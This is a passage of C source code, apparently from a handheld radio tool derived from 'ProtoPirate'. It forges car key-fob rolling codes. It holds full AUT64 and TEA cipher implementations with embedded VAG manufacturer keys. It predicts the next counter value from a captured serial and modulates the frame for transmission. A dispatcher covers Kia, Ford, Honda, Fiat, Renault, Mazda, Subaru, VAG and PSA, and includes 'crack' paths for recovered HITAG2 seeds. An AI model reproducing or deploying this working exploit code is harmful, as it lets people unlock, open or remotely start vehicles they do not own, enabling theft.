    {0x3, 0x2, 0x1, 0x0, 0x7, 0x6, 0x5, 0x4}, // Round 8
    {0x2, 0x3, 0x0, 0x1, 0x6, 0x7, 0x4, 0x5}, // Round 9
    {0x1, 0x0, 0x3, 0x2, 0x5, 0x4, 0x7, 0x6}, // Round 10
    {0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7}, // Round 11
};

static const uint8_t vag_enc_aut64_table_offset[256] = {
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, // 0
    0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xA, 0xB, 0xC, 0xD, 0xE, 0xF, // 1
    0x0, 0x2, 0x4, 0x6, 0x8, 0xA, 0xC, 0xE, 0x3, 0x1, 0x7, 0x5, 0xB, 0x9, 0xF, 0xD, // 2
    0x0, 0x3, 0x6, 0x5, 0xC, 0xF, 0xA, 0x9, 0xB, 0x8, 0xD, 0xE, 0x7, 0x4, 0x1, 0x2, // 3
    0x0, 0x4, 0x8, 0xC, 0x3, 0x7, 0xB, 0xF, 0x6, 0x2, 0xE, 0xA, 0x5, 0x1, 0xD, 0x9, // 4
    0x0, 0x5, 0xA, 0xF, 0x7, 0x2, 0xD, 0x8, 0xE, 0xB, 0x4, 0x1, 0x9, 0xC, 0x3, 0x6, // 5
    0x0, 0x6, 0xC, 0xA, 0xB, 0xD, 0x7, 0x1, 0x5, 0x3, 0x9, 0xF, 0xE, 0x8, 0x2, 0x4, // 6
    0x0, 0x7, 0xE, 0x9, 0xF, 0x8, 0x1, 0x6, 0xD, 0xA, 0x3, 0x4, 0x2, 0x5, 0xC, 0xB, // 7
    0x0, 0x8, 0x3, 0xB, 0x6, 0xE, 0x5, 0xD, 0xC, 0x4, 0xF, 0x7, 0xA, 0x2, 0x9, 0x1, // 8
    0x0, 0x9, 0x1, 0x8, 0x2, 0xB, 0x3, 0xA, 0x4, 0xD, 0x5, 0xC, 0x6, 0xF, 0x7, 0xE, // 9
    0x0, 0xA, 0x7, 0xD, 0xE, 0x4, 0x9, 0x3, 0xF, 0x5, 0x8, 0x2, 0x1, 0xB, 0x6, 0xC, // A
    0x0, 0xB, 0x5, 0xE, 0xA, 0x1, 0xF, 0x4, 0x7, 0xC, 0x2, 0x9, 0xD, 0x6, 0x8, 0x3, // B
    0x0, 0xC, 0xB, 0x7, 0x5, 0x9, 0xE, 0x2, 0xA, 0x6, 0x1, 0xD, 0xF, 0x3, 0x4, 0x8, // C
    0x0, 0xD, 0x9, 0x4, 0x1, 0xC, 0x8, 0x5, 0x2, 0xF, 0xB, 0x6, 0x3, 0xE, 0xA, 0x7, // D
    0x0, 0xE, 0xF, 0x1, 0xD, 0x3, 0x2, 0xC, 0x9, 0x7, 0x6, 0x8, 0x4, 0xA, 0xB, 0x5, // E
    0x0, 0xF, 0xD, 0x2, 0x9, 0x6, 0x4, 0xB, 0x1, 0xE, 0xC, 0x3, 0x8, 0x7, 0x5, 0xA  // F
};

static const uint8_t vag_enc_aut64_table_sub[16] = {
    0x0, 0x1, 0x9, 0xE, 0xD, 0xB, 0x7, 0x6, 0xF, 0x2, 0xC, 0x5, 0xA, 0x4, 0x3, 0x8};

/* Embedded packed AUT64 keys (private copy of vag_keys_packed) */
static const uint8_t
    vag_enc_keys_packed[VAG_ENC_KEYS_COUNT][VAG_ENC_AUT64_KEY_PACKED_SIZE] = {
        {0x01, 0x37, 0x6C, 0x86, 0xAD, 0xAB, 0xCC, 0x43, 0x07, 0x4D, 0xE8, 0x59, 0xC1, 0x2F, 0x36, 0xAB},
        {0x02, 0x37, 0x7C, 0x65, 0xCE, 0xDC, 0x42, 0xEA, 0xA4, 0x53, 0xE8, 0x61, 0xD9, 0xB7, 0x20, 0xFC},
        {0x03, 0x8A, 0xA3, 0x7B, 0x1E, 0x56, 0x1F, 0x83, 0x84, 0xB6, 0x19, 0xC5, 0x2E, 0x0A, 0x3F, 0xD7}};

static uint8_t vag_enc_aut64_key_nibble(
    const struct vag_enc_aut64_key key,
    const uint8_t nibble,
    const uint8_t table[],
    const uint8_t iteration) {
    const uint8_t keyValue = key.key[table[iteration]];
    const uint8_t offset = (keyValue << 4) | nibble;
    return vag_enc_aut64_table_offset[offset];
}

static uint8_t vag_enc_aut64_round_key(
    const struct vag_enc_aut64_key key,
    const uint8_t state[],
    const uint8_t roundN) {
    uint8_t result_hi = 0, result_lo = 0;
    for(int i = 0; i < VAG_ENC_AUT64_BLOCK_SIZE - 1; i++) {
        result_hi ^= vag_enc_aut64_key_nibble(key, state[i] >> 4, vag_enc_aut64_table_un[roundN], i);
        result_lo ^= vag_enc_aut64_key_nibble(key, state[i] & 0x0F, vag_enc_aut64_table_ln[roundN], i);
    }
    return (result_hi << 4) | result_lo;
}

static uint8_t
    vag_enc_aut64_final_byte_nibble(const struct vag_enc_aut64_key key, const uint8_t table[]) {
    const uint8_t keyValue = key.key[table[VAG_ENC_AUT64_BLOCK_SIZE - 1]];
    return vag_enc_aut64_table_sub[keyValue] << 4;
}

static uint8_t vag_enc_aut64_encrypt_final_byte_nibble(
    const struct vag_enc_aut64_key key,
    const uint8_t nibble,
    const uint8_t table[]) {
    const uint8_t offset = vag_enc_aut64_final_byte_nibble(key, table);
    int i;
    for(i = 0; i < 16; i++) {
        if(vag_enc_aut64_table_offset[offset + i] == nibble) {
            break;
        }
    }
    return i;
}

static uint8_t vag_enc_aut64_encrypt_compress(
    const struct vag_enc_aut64_key key,
    const uint8_t state[],
    const uint8_t roundN) {
    const uint8_t roundKey = vag_enc_aut64_round_key(key, state, roundN);
    uint8_t result_hi = roundKey >> 4, result_lo = roundKey & 0x0F;
    result_hi ^= vag_enc_aut64_encrypt_final_byte_nibble(
        key, state[VAG_ENC_AUT64_BLOCK_SIZE - 1] >> 4, vag_enc_aut64_table_un[roundN]);
    result_lo ^= vag_enc_aut64_encrypt_final_byte_nibble(
        key, state[VAG_ENC_AUT64_BLOCK_SIZE - 1] & 0x0F, vag_enc_aut64_table_ln[roundN]);
    return (result_hi << 4) | result_lo;
}

static uint8_t vag_enc_aut64_substitute(const struct vag_enc_aut64_key key, const uint8_t byte) {
    return (key.sbox[byte >> 4] << 4) | key.sbox[byte & 0x0F];
}

static void vag_enc_aut64_permute_bytes(const struct vag_enc_aut64_key key, uint8_t state[]) {
    uint8_t result[VAG_ENC_AUT64_PBOX_SIZE] = {0};
    for(int i = 0; i < VAG_ENC_AUT64_PBOX_SIZE; i++) {
        result[key.pbox[i]] = state[i];
    }
    memcpy(state, result, VAG_ENC_AUT64_PBOX_SIZE);
}

static uint8_t vag_enc_aut64_permute_bits(const struct vag_enc_aut64_key key, const uint8_t byte) {
    uint8_t result = 0;
    for(int i = 0; i < 8; i++) {
        if(byte & (1 << i)) {
            result |= (1 << key.pbox[i]);
        }
    }
    return result;
}

static void vag_enc_aut64_reverse_box(uint8_t* reversed, const uint8_t* box, const size_t len) {
    for(size_t i = 0; i < len; i++) {
        for(size_t j = 0; j < len; j++) {
            if(box[j] == i) {
                reversed[i] = j;
                break;
            }
        }
    }
}

static void vag_enc_aut64_encrypt(const struct vag_enc_aut64_key key, uint8_t message[]) {
    struct vag_enc_aut64_key reverse_key;
    memcpy(reverse_key.key, key.key, VAG_ENC_AUT64_KEY_SIZE);
    vag_enc_aut64_reverse_box(reverse_key.pbox, key.pbox, VAG_ENC_AUT64_PBOX_SIZE);
    vag_enc_aut64_reverse_box(reverse_key.sbox, key.sbox, VAG_ENC_AUT64_SBOX_SIZE);

    for(int i = 0; i < VAG_ENC_AUT64_NUM_ROUNDS; i++) {
        vag_enc_aut64_permute_bytes(reverse_key, message);
        message[7] = vag_enc_aut64_encrypt_compress(reverse_key, message, i);
        message[7] = vag_enc_aut64_substitute(reverse_key, message[7]);
        message[7] = vag_enc_aut64_permute_bits(reverse_key, message[7]);
        message[7] = vag_enc_aut64_substitute(reverse_key, message[7]);
    }
}

static void vag_enc_aut64_unpack(struct vag_enc_aut64_key* dest, const uint8_t src[]) {
    dest->index = src[0];
    for(uint8_t i = 0; i < VAG_ENC_AUT64_KEY_SIZE / 2; i++) {
        dest->key[i * 2] = src[i + 1] >> 4;
        dest->key[i * 2 + 1] = src[i + 1] & 0xF;
    }
    uint32_t pbox = (src[5] << 16) | (src[6] << 8) | src[7];
    for(int8_t i = VAG_ENC_AUT64_PBOX_SIZE - 1; i >= 0; i--) {
        dest->pbox[i] = pbox & 0x7;
        pbox >>= 3;
    }
    for(uint8_t i = 0; i < VAG_ENC_AUT64_SBOX_SIZE / 2; i++) {
        dest->sbox[i * 2] = src[i + 8] >> 4;
        dest->sbox[i * 2 + 1] = src[i + 8] & 0xF;
    }
}

static struct vag_enc_aut64_key vag_enc_keys[VAG_ENC_KEYS_COUNT];
static int8_t vag_enc_keys_loaded = -1;

static void vag_enc_load_keys(void) {
    if(vag_enc_keys_loaded >= 0) return;
    for(uint8_t i = 0; i < VAG_ENC_KEYS_COUNT; i++) {
        vag_enc_aut64_unpack(&vag_enc_keys[i], vag_enc_keys_packed[i]);
    }
    vag_enc_keys_loaded = 0;
}

static struct vag_enc_aut64_key* vag_enc_get_key(uint8_t index) {
    for(uint8_t i = 0; i < VAG_ENC_KEYS_COUNT; i++) {
        if(vag_enc_keys[i].index == index) {
            return &vag_enc_keys[i];
        }
    }
    return NULL;
}

static bool vag_enc_aut64_encrypt_block(uint8_t* block, int key_index) {
    vag_enc_load_keys();
    struct vag_enc_aut64_key* key = vag_enc_get_key((uint8_t)(key_index + 1));
    if(!key) {
        return false;
    }
    vag_enc_aut64_encrypt(*key, block);
    return true;
}

/* TEA (private copy) - used by VAG Type 2 */
#define VAG_ENC_TEA_DELTA  0x9E3779B9U
#define VAG_ENC_TEA_ROUNDS 32

static const uint32_t vag_enc_tea_key_schedule[] =
    {0x0B46502D, 0x5E253718, 0x2BF93A19, 0x622C1206};

static void vag_enc_tea_encrypt(uint32_t* v0, uint32_t* v1, const uint32_t* key_schedule) {
    uint32_t sum = 0;
    for(int i = 0; i < VAG_ENC_TEA_ROUNDS; i++) {
        *v0 += (((*v1 << 4) ^ (*v1 >> 5)) + *v1) ^ (sum + key_schedule[sum & 3]);
        sum += VAG_ENC_TEA_DELTA;
        *v1 += (((*v0 << 4) ^ (*v0 >> 5)) + *v0) ^ (sum + key_schedule[(sum >> 11) & 3]);
    }
}

static uint8_t vag_enc_btn_to_byte(uint8_t btn, uint8_t vag_type) {
    if(vag_type == 1) {
        return btn;
    }
    switch(btn) {
    case 0x1:
        return 0x10;
    case 0x2:
        return 0x20;
    case 0x4:
        return 0x40;
    default:
        return btn;
    }
}

static uint8_t vag_enc_get_dispatch_byte(uint8_t btn, uint8_t vag_type) {
    if(vag_type == 1 || vag_type == 2) {
        switch(btn) {
        case 0x20:
        case 2:
            return 0x2A;
        case 0x40:
        case 4:
            return 0x46;
        case 0x10:
        case 1:
            return 0x1C;
        default:
            return 0x2A;
        }
    } else {
        switch(btn) {
        case 0x20:
        case 2:
            return 0x2B;
        case 0x40:
        case 4:
            return 0x47;
        case 0x10:
        case 1:
            return 0x1D;
        default:
            return 0x2B;
        }
    }
}

static inline void vag_enc_manch(LevelDuration* up, size_t* idx, bool bit, uint32_t te) {
    if(bit) {
        up[(*idx)++] = level_duration_make(true, te);
        up[(*idx)++] = level_duration_make(false, te);
    } else {
        up[(*idx)++] = level_duration_make(false, te);
        up[(*idx)++] = level_duration_make(true, te);
    }
}

/* VAG frame config (settable by caller before <p>_enc_next):
 *   vag_enc_type      : desired frame type 1..4 (default 1)
 *   vag_enc_type_byte : vehicle indicator = top byte of key1_high
 *                       (0x00 VAG NEW, 0xC0 VAG OLD, 0xC1 AUDI, 0xC2 SEAT,
 *                        0xC3 SKODA). Default 0x00.
 *   vag_enc_key_idx   : AUT64 key index override (0xFF = auto by type;
 *                       type1->0, type3->1, type4->2). Default 0xFF.
 * Frame carry (>64 bits): the on-air frame is 80 bits (key1 64 + key2 16).
 * <p>_enc_build returns key1 as the 64-bit *out_data word and carries the
 * extra key2 (16 bits) plus the resolved frame type in these statics, read
 * back by <p>_enc_upload (renault-style carry). */
static uint8_t vag_enc_type = 1;
static uint8_t vag_enc_type_byte = 0x00;
static uint8_t vag_enc_key_idx = 0xFF;
static uint8_t vag_enc_frame_vt = 1;
static uint16_t vag_enc_frame_key2 = 0;

static bool vag_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    uint8_t vt = vag_enc_type;
    if(vt < 1 || vt > 4) vt = 1;
    uint8_t type_byte = vag_enc_type_byte;
    /* Mirror encoder deserialize fixup: a Type1 frame with VAG-NEW type byte
     * is emitted as Type2 (TEA). */
    if(vt == 1 && type_byte == 0x00) vt = 2;

    uint8_t btn_byte = vag_enc_btn_to_byte(btn, vt);
    uint8_t dispatch = vag_enc_get_dispatch_byte(btn_byte, vt);

    uint8_t block[8];
    block[0] = (uint8_t)(serial >> 24);
    block[1] = (uint8_t)(serial >> 16);
    block[2] = (uint8_t)(serial >> 8);
    block[3] = (uint8_t)(serial);
    block[4] = (uint8_t)(cnt);
    block[5] = (uint8_t)(cnt >> 8);
    block[6] = (uint8_t)(cnt >> 16);
    block[7] = btn_byte;

    if(vt == 2) {
        uint32_t v0 = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
                      ((uint32_t)block[2] << 8) | (uint32_t)block[3];
        uint32_t v1 = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
                      ((uint32_t)block[6] << 8) | (uint32_t)block[7];
        vag_enc_tea_encrypt(&v0, &v1, vag_enc_tea_key_schedule);
        block[0] = (uint8_t)(v0 >> 24);
        block[1] = (uint8_t)(v0 >> 16);
        block[2] = (uint8_t)(v0 >> 8);
        block[3] = (uint8_t)(v0);
        block[4] = (uint8_t)(v1 >> 24);
        block[5] = (uint8_t)(v1 >> 16);
        block[6] = (uint8_t)(v1 >> 8);
        block[7] = (uint8_t)(v1);
    } else {
        int key_idx = (vag_enc_key_idx != 0xFF) ? (int)vag_enc_key_idx :
                                                  (vt == 1 ? 0 : (vt == 4 ? 2 : 1));
        if(!vag_enc_aut64_encrypt_block(block, key_idx)) return false;
    }

    uint32_t key1_high = ((uint32_t)type_byte << 24) | ((uint32_t)block[0] << 16) |
                         ((uint32_t)block[1] << 8) | (uint32_t)block[2];
    uint32_t key1_low = ((uint32_t)block[3] << 24) | ((uint32_t)block[4] << 16) |
                        ((uint32_t)block[5] << 8) | (uint32_t)block[6];
    uint16_t key2 = (uint16_t)((((uint32_t)(block[7] & 0xFF) << 8) | (uint32_t)(dispatch & 0xFF)) &
                               0xFFFF);

    vag_enc_frame_vt = vt;
    vag_enc_frame_key2 = key2;

    *out_data = ((uint64_t)key1_high << 32) | key1_low;
    *out_bits = 80;
    return true;
}

static size_t vag_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;
    if(cap < 700) return 0; /* worst-case built size: type1/2 ~635, type3/4 ~518 */

    uint8_t vt = vag_enc_frame_vt;
    uint64_t key1 = data;
    uint16_t key2 = vag_enc_frame_key2;
    size_t index = 0;

    if(vt == 1 || vt == 2) {
        for(int i = 0; i < 220; i++) {
            up[index++] = level_duration_make(true, 300);
            up[index++] = level_duration_make(false, 300);
        }
        up[index++] = level_duration_make(false, 300);
        up[index++] = level_duration_make(true, 300);

        uint16_t prefix = (vt == 1) ? 0xAF3F : 0xAF1C;
        for(int i = 15; i >= 0; i--) {
            vag_enc_manch(up, &index, (prefix >> i) & 1, 300);
        }

        uint64_t key1_inv = ~key1;
        for(int i = 63; i >= 0; i--) {
            vag_enc_manch(up, &index, (key1_inv >> i) & 1, 300);
        }

        uint16_t key2_inv = ~key2;
        for(int i = 15; i >= 0; i--) {
            vag_enc_manch(up, &index, (key2_inv >> i) & 1, 300);
        }

        up[index++] = level_duration_make(false, 6000);
    } else {
        for(int repeat = 0; repeat < 2; repeat++) {
            for(int i = 0; i < 45; i++) {
                up[index++] = level_duration_make(true, 500);
                up[index++] = level_duration_make(false, 500);
            }
            up[index++] = level_duration_make(true, 1000);
            up[index++] = level_duration_make(false, 500);
            for(int i = 0; i < 3; i++) {
                up[index++] = level_duration_make(true, 750);
                up[index++] = level_duration_make(false, 750);
            }
            for(int i = 63; i >= 0; i--) {
                vag_enc_manch(up, &index, (key1 >> i) & 1, 500);
            }
            for(int i = 15; i >= 0; i--) {
                vag_enc_manch(up, &index, (key2 >> i) & 1, 500);
            }
            up[index++] = level_duration_make(false, 10000);
        }
    }

    return index;
}

/* Source flag: SubGhzProtocolFlag_AM => not FSK */
static const bool vag_enc_is_fsk = false;

static size_t vag_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data;
    uint16_t bits;
    if(!vag_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return vag_enc_upload(data, bits, up, cap);
}

/* ======================================================================
 * TRAILING NOTES
 * ----------------------------------------------------------------------
 * KIA V6:
 *   entry point : kia_v6_enc_next(serial, btn, cnt, up, cap)
 *   is_fsk      : kia_v6_enc_is_fsk = true   (source SubGhzProtocolFlag_FM)
 *   cap         : >= 1980 LevelDuration entries (worst-case build ~1928).
 *   >64-bit carry: on-air frame is 144 bits. kia_v6_enc_build returns
 *                 part1 (fx + first AES bytes) as the 64-bit out_data word;
 *                 part2 (kia_v6_enc_frame_p2_lo/_hi) and part3
 *                 (kia_v6_enc_frame_p3) are carried in module statics and
 *                 read back by kia_v6_enc_upload.
 *   Fx field    : kia_v6_enc_fx (default 0x00) — not derivable from
 *                 serial/btn/cnt; override if a captured Fx is known.
 *
 * VAG:
 *   entry point : vag_enc_next(serial, btn, cnt, up, cap)
 *   is_fsk      : vag_enc_is_fsk = false   (source SubGhzProtocolFlag_AM)
 *   cap         : >= 700 LevelDuration entries (type1/2 ~635, type3/4 ~518).
 *   >64-bit carry: on-air frame is 80 bits (key1 64 + key2 16).
 *                 vag_enc_build returns key1 as the 64-bit out_data word and
 *                 carries the extra key2 16 bits (vag_enc_frame_key2) plus the
 *                 resolved frame type (vag_enc_frame_vt) in module statics,
 *                 read back by vag_enc_upload.
 *   config      : vag_enc_type (1..4, default 1), vag_enc_type_byte (vehicle
 *                 indicator, default 0x00), vag_enc_key_idx (0xFF=auto).
 *                 Type1+type_byte 0x00 is emitted as Type2/TEA (matches the
 *                 source encoder deserialize fixup).
 *
 * COLLISION-SAFETY CONFIRMATION:
 *   Every static, struct and macro emitted here carries a kia_v6_enc_ or
 *   vag_enc_ prefix. There are NO bare aut64_* / aes_* / vag_keys_packed /
 *   <p>_const references. The AES tables/key, the AUT64 cipher + boxes +
 *   struct, the packed VAG keys and the TEA schedule are all PRIVATE
 *   duplicated copies. Only the provided shim symbols
 *   (LevelDuration, level_duration_make, subghz_protocol_blocks_crc8) are
 *   referenced without redefinition.
 * ====================================================================== */

// ============================================================================
//  Dispatcher d'ENCODAGE — génère le PROCHAIN code rolling (compteur+1)
//  et le convertit en pulses int32 pour cc_send_raw / cc_send_raw_fsk.
//  Renvoie 0 si pas d'encoder / clé requise (ex. Renault V1 HITAG2).
// ============================================================================
typedef size_t (*pp_enc_fn)(uint32_t, uint8_t, uint32_t, LevelDuration*, size_t);
struct PpEncoderReg { const char* name; pp_enc_fn enc_next; bool is_fsk; };
static PpEncoderReg pp_encoders[] = {
    { "Subaru",     subaru_enc_next,     subaru_enc_is_fsk },
    { "Kia V1",     kia_v1_enc_next,     kia_v1_enc_is_fsk },
    { "Kia V2",     kia_v2_enc_next,     kia_v2_enc_is_fsk },
    { "Kia V7",     kia_v7_enc_next,     kia_v7_enc_is_fsk },
    { "Ford V0",    ford_v0_enc_next,    ford_v0_enc_is_fsk },
    { "Fiat V0",    fiat_v0_enc_next,    fiat_v0_enc_is_fsk },   // replay only (pas de cipher)
    { "Renault V1", renault_v1_enc_next, renault_v1_enc_is_fsk },// 0 sans clé/seed HITAG2
    { "Kia V0",      kia_v0_enc_next,      kia_v0_enc_is_fsk },
    { "Ford V1",     ford_v1_enc_next,     ford_v1_enc_is_fsk },
    { "Ford V2",     ford_v2_enc_next,     ford_v2_enc_is_fsk },
    { "Honda V1",    honda_v1_enc_next,    honda_v1_enc_is_fsk },
    { "Honda V2",    honda_v2_enc_next,    honda_v2_enc_is_fsk },
    { "Honda Static",honda_static_enc_next,honda_static_enc_is_fsk },
    { "Fiat V1",     fiat_v1_enc_next,     fiat_v1_enc_is_fsk },
    { "Renault V0",  renault_v0_enc_next,  renault_v0_enc_is_fsk },
    { "Mazda V0",    mazda_v0_enc_next,    mazda_v0_enc_is_fsk },
    { "Kia V3/V4",   kia_v3v4_enc_next,    kia_v3v4_enc_is_fsk },
    { "Kia V5",      kia_v5_enc_next,      kia_v5_enc_is_fsk },
    { "Kia V6",      kia_v6_enc_next,      kia_v6_enc_is_fsk },
    { "VAG",         vag_enc_next,         vag_enc_is_fsk },
    { "PSA",         psa_enc_next,         psa_enc_is_fsk },
};
static const int PP_NUM_ENCODERS = (int)(sizeof(pp_encoders)/sizeof(pp_encoders[0]));
// Matche le nom d'encodeur en ignorant un suffixe " (crack)" : le crack renomme
// p.ex. "PSA" -> "PSA (crack)". Permet le renvoi apres crack (PSA/Renault/...).
static bool pp_name_eq(const char* enc, const char* proto) {
    if(strcmp(enc, proto) == 0) return true;
    size_t le = strlen(enc);
    if(strncmp(proto, enc, le) == 0 && strcmp(proto + le, " (crack)") == 0) return true;
    return false;
}
// Nom fonctionnel du bouton par protocole (porté des <proto>_get_button_name de
// ProtoPirate). Retourne NULL si inconnu -> l'appelant affiche le code brut.
// Kia V2-V6 / PSA / Scher-Khan / StarLine n'ont pas de mapping (code brut).
static const char* pp_button_name(const char* proto, uint8_t btn) {
    if(!proto) return NULL;
    if(!strcmp(proto, "Subaru")) { static const char* n[4] = {"Lock","Unlock","Trunk","Panic"}; return n[btn & 3]; }
    if(!strcmp(proto, "Chrysler V0")) return btn==1?"Lock":btn==2?"Unlock":NULL;
    if(!strncmp(proto, "Kia V0", 6) || !strcmp(proto,"Suzuki V0") || !strcmp(proto,"Mitsubishi V0"))
        return btn==1?"Lock":btn==2?"Unlock":btn==3?"Trunk":NULL;      // defaut KIA/MITSU
    if(!strcmp(proto, "Kia V1")) return btn==1?"Close":btn==2?"Open":btn==3?"Boot":NULL;
    if(!strcmp(proto, "Kia V7")) return btn==1?"Lock":btn==2?"Unlock":(btn==3||btn==8)?"Trunk":NULL;
    if(!strcmp(proto, "Ford V0")) return btn==0x01?"Panic":btn==0x02?"Lock":btn==0x04?"Unlock":btn==0x08?"Boot":NULL;
    if(!strcmp(proto, "Ford V1")) return btn==0?"Sync":btn==1?"Lock":btn==2?"Unlock":btn==4?"Trunk":btn==8?"Panic":NULL;
    if(!strcmp(proto, "Ford V2")) { switch(btn){case 0x10:return "Lock";case 0x11:return "Unlock";case 0x13:return "Trunk";case 0x14:return "Panic";case 0x15:return "RemoteStart";} return NULL; }
    if(!strcmp(proto, "Ford V3")) return btn==0x01?"Lock":btn==0x02?"Unlock":NULL;
    if(!strcmp(proto, "Honda Static")) { static const char* n[9]={"Lock","Unlock","Unknown","Trunk","Remote Start","Unknown","Unknown","Panic","Lock x2"}; return (btn>=1&&btn<=9)?n[btn-1]:NULL; }
    if(!strcmp(proto, "Honda V1")) return btn==0?"Unlock":btn==8?"Lock":btn==9?"Trunk":btn==10?"Panic":NULL;
    if(!strcmp(proto, "Honda V2")) return btn==0x02?"Lock":btn==0x04?"Unlock":NULL;
    if(!strcmp(proto, "Mazda V0")) return btn==0x01?"Lock":btn==0x02?"Unlock":btn==0x04?"Trunk":btn==0x08?"Remote":NULL;
    if(!strcmp(proto, "Fiat V0")) { uint8_t l=btn&0x0F; if(l>=0x04&&l<=0x07)return "Lock"; if(l>=0x08&&l<=0x0B)return "Unlock"; return NULL; }
    if(!strcmp(proto, "Fiat V1")) return btn==0x8?"Unlock":btn==0x4?"Lock":btn==0x2?"Trunk":btn==0x1?"Close":NULL;
    if(!strcmp(proto, "Fiat V2")) { uint8_t s=btn>>6; return s==0x2?"Lock":s==0x3?"Unlock":s==0x1?"Trunk":NULL; }
    if(!strcmp(proto, "Renault V0")) return btn==0x05?"Trunk":btn==0x06?"Lock":btn==0x0A?"Unlock":NULL;
    if(!strncmp(proto, "Renault V1", 10)) { static const char* n[9]={"Sync","Lock","Unlock","??","Trunk","??","??","??","Panic"}; return btn<9?n[btn]:NULL; }
    if(!strcmp(proto, "VAG")) { switch(btn){case 0x1:case 0x10:return "Unlock";case 0x2:case 0x20:return "Lock";case 0x4:case 0x40:return "Boot";} return NULL; }
    return NULL;
}

static bool pp_has_encoder(const char* proto) {
    if(!proto) return false;
    // Renault V1 : re-émission possible uniquement après crack de la seed HITAG2.
    if(strstr(proto, "Renault V1")) return rv1_bf_found();
    for(int i = 0; i < PP_NUM_ENCODERS; i++)
        if(pp_name_eq(pp_encoders[i].name, proto)) return true;
    return false;
}
static int pp_encode_next(const char* proto, uint32_t serial, uint8_t btn, uint32_t cnt,
                          int32_t* pulses, int cap, bool* is_fsk) {
    if(!proto) return 0;
    // Scratch d'émission 16 KB alloué A LA DEMANDE : jamais résident au boot
    // (RAM critique au démarrage), présent seulement le temps d'un TX puis libéré.
    LevelDuration* up = (LevelDuration*)malloc(2048 * sizeof(LevelDuration));
    if(!up) return 0;
    int result = 0;
    // Renault V1 : next-code possible seulement si la seed HITAG2 a été crackée.
    // (matche "Renault V1" ET "Renault V1 (crack)")
    if(strstr(proto, "Renault V1") && rv1_bf_found()) {
        size_t n = renault_v1_enc_next_with_seed(serial, btn, cnt, rv1_bf_seed(), up, 2048);
        if(is_fsk) *is_fsk = renault_v1_enc_is_fsk;
        if(n) result = pp_ld_to_pulses(up, n, pulses, cap);
    } else {
        for(int i = 0; i < PP_NUM_ENCODERS; i++) {
            if(pp_name_eq(pp_encoders[i].name, proto)) {
                size_t n = pp_encoders[i].enc_next(serial, btn, cnt, up, 2048);
                if(is_fsk) *is_fsk = pp_encoders[i].is_fsk;
                if(n) result = pp_ld_to_pulses(up, n, pulses, cap);
                break;
            }
        }
    }
    free(up);
    return result;
}
